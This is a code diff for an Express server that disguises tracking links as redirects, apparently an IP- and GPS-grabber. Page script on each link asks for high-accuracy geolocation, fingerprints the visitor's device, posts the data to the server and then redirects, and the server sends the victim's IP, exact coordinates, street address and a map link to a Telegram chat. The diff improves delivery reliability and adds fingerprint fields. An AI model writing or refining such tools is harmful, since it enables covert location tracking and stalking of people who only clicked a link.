@@ -95,31 +95,36 @@ app.post('/api/log-gps', async (req, res) => {
     address = await reverseGeocode(latitude, longitude);
   }
 
-  let msg = `🎯 <b>رابط تم فتحه!</b>\n━━━━━━━━━━━━━━━━━━━\n`;
+  let msg = `🎯 <b>رابط فُتح!</b>\n━━━━━━━━━━━━━━━━━━━\n`;
   msg += `<b>📌 الكود:</b> <code>${code}</code>\n`;
   msg += `<b>🔌 IP:</b> <code>${ip}</code>\n`;
   msg += `⏰ ${new Date().toLocaleString('ar-SA')}\n`;
   msg += `━━━━━━━━━━━━━━━━━━━\n\n`;
 
   if (latitude && longitude) {
-    msg += `<b>✅ 📍 GPS Coordinates</b>\n`;
-    msg += `📍 <code>${latitude}, ${longitude}</code>\n`;
-    msg += `📏 دقة: ±${accuracy.toFixed(0)} متر\n`;
-    msg += `🗺️ <a href="https://maps.google.com/?q=${latitude},${longitude}">Maps</a>\n\n`;
+    msg += `<b>✅ 📍 GPS (موقع دقيق)</b>\n`;
+    msg += `📍 <code>${parseFloat(latitude).toFixed(6)}, ${parseFloat(longitude).toFixed(6)}</code>\n`;
+    msg += `📏 دقة: ±${parseInt(accuracy)} متر\n`;
+    msg += `🗺️ <a href="https://maps.google.com/?q=${latitude},${longitude}">اضغط للخريطة</a>\n`;
     
     if (address) {
-      msg += `<b>📮 العنوان:</b>\n${address}\n\n`;
+      msg += `📮 ${address}\n`;
     }
+    msg += `━━━━━━━━━━━━━━━━━━━\n\n`;
+  } else {
+    msg += `<b>❌ GPS</b>\nالمستخدم رفض السماح بالموقع\n━━━━━━━━━━━━━━━━━━━\n\n`;
   }
 
   if (deviceData) {
     msg += `<b>📱 بيانات الجهاز:</b>\n`;
     if (deviceData.battery) msg += `🔋 البطارية: ${deviceData.battery}%\n`;
-    if (deviceData.deviceName) msg += `📱 اسم الجهاز: ${deviceData.deviceName}\n`;
+    if (deviceData.deviceType) msg += `📱 نوع الجهاز: ${deviceData.deviceType}\n`;
     if (deviceData.networkName) msg += `📡 شبكة WiFi: ${deviceData.networkName}\n`;
     if (deviceData.screenRes) msg += `📺 دقة الشاشة: ${deviceData.screenRes}\n`;
     if (deviceData.browser) msg += `🌐 المتصفح: ${deviceData.browser}\n`;
     if (deviceData.os) msg += `🖥️ النظام: ${deviceData.os}\n`;
+    if (deviceData.language) msg += `🗣️ اللغة: ${deviceData.language}\n`;
+    if (deviceData.cores) msg += `⚙️ المعالجات: ${deviceData.cores}\n`;
   }
 
   await sendToTelegram(msg);
@@ -159,32 +164,27 @@ app.get('/:code', (req, res) => {
 
     function collectDeviceData() {
       const ua = navigator.userAgent;
-      let browser = 'Unknown';
-      let os = 'Unknown';
+      let browser = 'Unknown', os = 'Unknown', deviceType = 'Unknown';
       
       if (/chrome/i.test(ua) && !/edg/i.test(ua)) browser = 'Chrome';
       else if (/firefox/i.test(ua)) browser = 'Firefox';
-      else if (/safari/i.test(ua)) browser = 'Safari';
+      else if (/safari/i.test(ua) && !/chrome/i.test(ua)) browser = 'Safari';
       else if (/edg/i.test(ua)) browser = 'Edge';
 
-      if (/android/i.test(ua)) os = 'Android';
-      else if (/iphone/i.test(ua)) os = 'iOS';
-      else if (/windows/i.test(ua)) os = 'Windows';
-      else if (/mac/i.test(ua)) os = 'macOS';
-      else if (/linux/i.test(ua)) os = 'Linux';
+      if (/android/i.test(ua)) { os = 'Android'; deviceType = 'Android'; }
+      else if (/iphone|ipad/i.test(ua)) { os = 'iOS'; deviceType = 'iPhone/iPad'; }
+      else if (/windows/i.test(ua)) { os = 'Windows'; deviceType = 'Windows PC'; }
+      else if (/mac/i.test(ua)) { os = 'macOS'; deviceType = 'Mac'; }
+      else if (/linux/i.test(ua)) { os = 'Linux'; deviceType = 'Linux'; }
 
       const data = {
         browser: browser,
         os: os,
+        deviceType: deviceType,
         screenRes: window.screen.width + 'x' + window.screen.height,
-        deviceName: navigator.hardwareConcurrency ? 'Cores: ' + navigator.hardwareConcurrency : 'Unknown'
+        cores: navigator.hardwareConcurrency || 'Unknown',
+        language: navigator.language
       };
-
-      if (navigator.getBattery) {
-        navigator.getBattery().then(battery => {
-          data.battery = Math.round(battery.level * 100);
-        });
-      }
 
       return data;
     }
@@ -199,15 +199,21 @@ app.get('/:code', (req, res) => {
         deviceData: deviceData
       };
 
-      navigator.sendBeacon(apiUrl, JSON.stringify(payload));
-      window.location.href = originalUrl;
+      fetch(apiUrl, {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify(payload),
+        keepalive: true
+      }).finally(() => {
+        window.location.href = originalUrl;
+      });
     }
 
     if (navigator.geolocation) {
       navigator.geolocation.getCurrentPosition(
         (pos) => send(pos.coords.latitude, pos.coords.longitude, pos.coords.accuracy),
         () => send(null, null, null),
-        { enableHighAccuracy: true, timeout: 3000, maximumAge: 0 }
+        { enableHighAccuracy: true, timeout: 5000, maximumAge: 0 }
       );
     } else {
       send(null, null, null);
